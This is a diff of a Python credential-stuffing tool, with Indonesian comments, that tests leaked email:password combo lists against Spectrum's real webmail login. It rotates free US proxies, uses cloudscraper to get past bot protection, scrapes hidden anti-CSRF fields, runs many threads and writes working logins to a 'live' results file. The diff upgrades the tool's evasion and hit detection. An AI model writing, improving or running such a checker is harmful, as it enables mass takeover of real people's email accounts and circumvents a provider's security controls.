@@ -1,27 +1,23 @@
-import requests
-from bs4 import BeautifulSoup
+import cloudscraper
 import random
 import time
-import sys
 import os
+import sys
+import requests
+import threading
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
-from colorama import Fore, Style, init
+from bs4 import BeautifulSoup
+from colorama import Fore, init
 
-# Inisialisasi warna terminal
 init(autoreset=True)
 
-class SpectrumChecker:
-    def __init__(self, combo_file, proxy_file, threads):
-        self.url = "https://webmail.spectrum.net/index.php/mail/auth"
-        self.combo_file = combo_file
-        self.proxy_file = proxy_file
-        self.threads = int(threads)
-        self.proxies = self._load_proxies()
+class ValosintChecker:
+    def __init__(self):
         self.valid_count = 0
         self.bad_count = 0
-        self.captcha_count = 0
-        
+        self.error_count = 0
+        self.lock = threading.Lock() # Mencegah tabrakan saat menghitung total
         self.logo = f"""
 {Fore.CYAN}    ____   ____  _     _       ____   ____  _  _  _____ 
 {Fore.CYAN}   |    \ |    || |   | |     |    | |    || || ||_   _|
@@ -29,127 +25,142 @@ class SpectrumChecker:
 {Fore.CYAN}   |  |  ||  |  || |___| |___  |  |  ||  |  || || |  | |  
 {Fore.CYAN}   |____/ |____||_____|_____| |____/ |____||_||_|  |_|  
 {Fore.YELLOW}   =====================================================
-{Fore.WHITE}   [+] NAME    : SPECTRUM SATELLITE CHECKER
-{Fore.WHITE}   [+] STATUS  : {Fore.GREEN}ACTIVE / ANTI-CAPTCHA LOGIC
+{Fore.WHITE}   [+] NAME    : VALOSINT CHECKER ID (BYPASS V5)
+{Fore.WHITE}   [+] STATUS  : {Fore.GREEN}SATELLITE CONNECTED / ANTI-FALSE POSITIVE
 {Fore.YELLOW}   =====================================================
         """
-
-    def _load_proxies(self):
-        """Mengambil proxy dari file atau scrape gratisan jika file kosong"""
-        proxies = []
-        if os.path.exists(self.proxy_file):
-            with open(self.proxy_file, 'r') as f:
-                proxies = [line.strip() for line in f if line.strip()]
-        
-        if not proxies:
-            print(f"{Fore.YELLOW}[!] Proxy file kosong. Mengambil proxy gratis dari API...")
-            try:
-                # Scrape proxy gratis sebagai cadangan
-                res = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all")
-                proxies = res.text.splitlines()
-            except:
-                print(f"{Fore.RED}[X] Gagal mengambil proxy gratis.")
-        return proxies
 
     def _get_time(self):
         return datetime.now().strftime("%H:%M:%S")
 
-    def _rotate_proxy(self):
-        if not self.proxies:
-            return None
-        p = random.choice(self.proxies)
-        return {"http": f"http://{p}", "https": f"http://{p}"}
-
-    def _save(self, name, data):
-        os.makedirs("results", exist_ok=True)
-        with open(f"results/{name}", "a") as f:
-            f.write(data + "\n")
-
-    def check_account(self, credential):
-        if ":" not in credential:
-            return
-        
-        email, password = credential.split(":")
-        proxy = self._rotate_proxy()
-        session = requests.Session()
-        
-        # Header untuk meniru Browser asli
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://webmail.spectrum.net',
-            'Referer': self.url
-        }
-
+    def _get_us_proxies(self):
+        """Mengambil Proxy khusus negara US secara gratis dari API"""
+        print(f"{Fore.YELLOW}[*] Mengambil proxy gratis (Region: USA)...")
         try:
-            # Step 1: Ambil Token & Cookies
-            res_get = session.get(self.url, proxies=proxy, timeout=10)
-            
-            # Deteksi Captcha Awal
-            if "captcha" in res_get.text.lower() or "challenge" in res_get.text.lower():
-                self.captcha_count += 1
-                return
+            url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=US&ssl=all&anonymity=all"
+            res = requests.get(url, timeout=10)
+            proxies = [line.strip() for line in res.text.splitlines() if line.strip()]
+            print(f"{Fore.GREEN}[+] Berhasil mendapatkan {len(proxies)} proxy USA.")
+            return proxies
+        except Exception as e:
+            print(f"{Fore.RED}[!] Gagal mengambil proxy gratis: {e}")
+            return []
 
+    def check_account(self, credential, proxies):
+        if ":" not in credential: return
+        email, password = credential.split(":")
+        
+        px = random.choice(proxies) if proxies else None
+        px_map = {"http": f"http://{px}", "https": f"http://{px}"} if px else None
+        
+        try:
+            target_url = "https://webmail.spectrum.net/index.php/mail/auth"
+            
+            # Bikin Session baru yang nyamar jadi Chrome Windows 10
+            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+                'Referer': target_url
+            }
+
+            # 1. Buka halaman depan dulu buat ambil SEMUA input tersembunyi (Anti-CSRF)
+            res_get = scraper.get(target_url, headers=headers, proxies=px_map, timeout=15)
             soup = BeautifulSoup(res_get.text, 'html.parser')
+            
             payload = {}
             for hidden in soup.find_all('input', type='hidden'):
                 if hidden.get('name'):
                     payload[hidden.get('name')] = hidden.get('value', '')
 
+            # 2. Tambahkan kredensial ke payload
             payload['email'] = email
             payload['password'] = password
 
-            # Step 2: Login Request
-            response = session.post(self.url, data=payload, headers=headers, proxies=proxy, timeout=15, allow_redirects=True)
-            
+            # 3. Kirim data Login
+            res = scraper.post(target_url, data=payload, headers=headers, proxies=px_map, timeout=15, allow_redirects=True)
+
             ts = self._get_time()
-            content = response.text.lower()
-
-            # Step 3: Logika Validasi Ketat
-            # 'signout' atau 'logout' biasanya muncul di dashboard sukses
-            if "signout" in content or "logout" in content or "inbox" in response.url:
+            content = res.text.lower()
+            
+            # 4. Validasi SUPER KETAT berdasarkan pesan web aslinya
+            
+            # Cek jika Password Salah / Akun Mati (DD)
+            if "doesn't match our records" in content or "invalid" in content or "incorrect" in content or "auth_failed" in content:
+                print(f"{Fore.RED}[{ts}] [DD]   {email} | Wrong Password/Not Match")
+                with self.lock:
+                    self.bad_count += 1
+            
+            # Cek jika Login Sukses (LIVE) - URL harus pindah dari /auth
+            elif "/auth" not in res.url and ("inbox" in res.url or "mail" in res.url or "signout" in content or "logout" in content):
                 print(f"{Fore.GREEN}[{ts}] [LIVE] {email} | {password}")
-                self._save("live.txt", f"{email}:{password}")
-                self.valid_count += 1
-            elif "invalid" in content or "incorrect" in content or "auth_failed" in content:
-                print(f"{Fore.RED}[{ts}] [DIE]  {email}")
-                self.bad_count += 1
+                if not os.path.exists("results"): os.makedirs("results")
+                with open("results/live.txt", "a") as f: f.write(f"{email}:{password}\n")
+                with self.lock:
+                    self.valid_count += 1
+            
+            # Cek jika akun dikunci sementara
+            elif "locked" in content or "suspended" in content:
+                print(f"{Fore.RED}[{ts}] [DD]   {email} | Account Locked")
+                with self.lock:
+                    self.bad_count += 1
+            
+            # Jika tidak sukses tapi juga tidak ada tulisan salah pass, berarti dicegat sistem bot
             else:
-                # Terdeteksi sebagai bot oleh server (Redirect balik ke login atau kena Captcha)
-                print(f"{Fore.YELLOW}[{ts}] [RETRY] {email} (Bot Detected/Proxy Flagged)")
-                self.captcha_count += 1
+                print(f"{Fore.MAGENTA}[{ts}] [RETRY] {email} | Terdeteksi Bot / Captcha")
+                with self.lock:
+                    self.error_count += 1
 
-        except:
-            # Error biasanya karena proxy mati
-            pass
+        except Exception as e:
+            # Mengabaikan error koneksi agar terminal tetap bersih
+            # print(f"{Fore.YELLOW}[{self._get_time()}] [ERROR] {email} | Koneksi Timeout/Proxy Mati")
+            with self.lock:
+                self.error_count += 1
 
     def start(self):
         os.system('cls' if os.name == 'nt' else 'clear')
         print(self.logo)
+
+        # Input dengan default fallback
+        combo_file = input(f"{Fore.WHITE}Masukkan File Combo [{Fore.CYAN}Tekan Enter untuk 'combo.txt'{Fore.WHITE}]: ").strip()
+        if not combo_file: combo_file = "combo.txt"
+
+        proxy_file = input(f"{Fore.WHITE}Masukkan File Proxy [{Fore.CYAN}Kosongkan u/ Auto Proxy USA{Fore.WHITE}]: ").strip()
+        thread_input = input(f"{Fore.WHITE}Jumlah Thread       [{Fore.CYAN}Default: 5{Fore.WHITE}]                : ").strip()
         
-        if not os.path.exists(self.combo_file):
-            print(f"{Fore.RED}File {self.combo_file} tidak ditemukan!")
+        if not os.path.exists(combo_file):
+            print(f"\n{Fore.RED}[!] File Combo '{combo_file}' tidak ditemukan di folder!")
             return
 
-        with open(self.combo_file, 'r') as f:
-            accounts = [line.strip() for line in f if line.strip()]
+        threads = int(thread_input) if thread_input.isdigit() else 5
+        accounts = [l.strip() for l in open(combo_file, 'r', encoding='utf-8') if ":" in l]
+        
+        # Penanganan Proxy
+        proxies = []
+        if proxy_file and os.path.exists(proxy_file):
+            proxies = [l.strip() for l in open(proxy_file, 'r', encoding='utf-8')]
+            print(f"{Fore.GREEN}[+] Memuat {len(proxies)} proxy dari file {proxy_file}")
+        else:
+            proxies = self._get_us_proxies()
 
-        print(f"Stats: {Fore.CYAN}{len(accounts)} Accounts {Fore.WHITE}| {Fore.CYAN}{len(self.proxies)} Proxies")
-        print(f"{Fore.YELLOW}Satelit terhubung. Memulai pemindaian...\n")
+        if not accounts:
+            print(f"{Fore.RED}[!] File combo kosong!")
+            return
 
-        with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            executor.map(self.check_account, accounts)
+        print(f"\n{Fore.YELLOW}[*] Memulai Pengecekan {len(accounts)} Akun dengan {threads} Threads...\n")
+        time.sleep(2)
 
+        # Memulai Checker dengan ThreadPoolExecutor
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            for acc in accounts:
+                executor.submit(self.check_account, acc, proxies)
+
+        # Tampilan Rangkuman Hasil Akhir
         print(f"\n{Fore.CYAN}=====================================================")
-        print(f"{Fore.GREEN}VALID: {self.valid_count} | {Fore.RED}DIE: {self.bad_count} | {Fore.YELLOW}RETRY/CAPTCHA: {self.captcha_count}")
-        print(f"{Fore.CYAN}Selesai! Hasil ada di folder 'results/'")
+        print(f"{Fore.GREEN}[+] TOTAL LIVE : {self.valid_count}")
+        print(f"{Fore.RED}[-] TOTAL DD   : {self.bad_count}")
+        print(f"{Fore.MAGENTA}[!] RETRY/ERR  : {self.error_count}")
+        print(f"{Fore.CYAN}=====================================================")
+        print(f"{Fore.WHITE}Selesai! Hasil LIVE disimpan di dalam folder 'results/'")
 
 if __name__ == "__main__":
-    # Ubah konfigurasi di sini
-    checker = SpectrumChecker(
-        combo_file="combo.txt", 
-        proxy_file="proxies.txt", 
-        threads=5 # Jangan terlalu tinggi agar tidak cepat kena Captcha
-    )
-    checker.start()
+    ValosintChecker().start()
